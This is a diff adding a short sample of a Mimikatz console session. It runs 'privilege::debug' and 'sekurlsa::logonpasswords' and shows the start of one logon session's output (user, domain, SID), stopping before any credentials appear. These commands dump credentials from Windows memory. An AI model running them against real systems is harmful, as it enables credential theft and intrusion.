@@ -1,0 +1,10 @@
+mimikatz # privilege::debug
+Privilege '20' OK
+ 
+mimikatz # sekurlsa::logonpasswords
+ 
+Authentication Id : 0 ; 515764 (00000000:0007deb4)
+Session           : Interactive from 2
+User Name         : Gentil Kiwi
+Domain            : vm-w7-ult-x
+SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
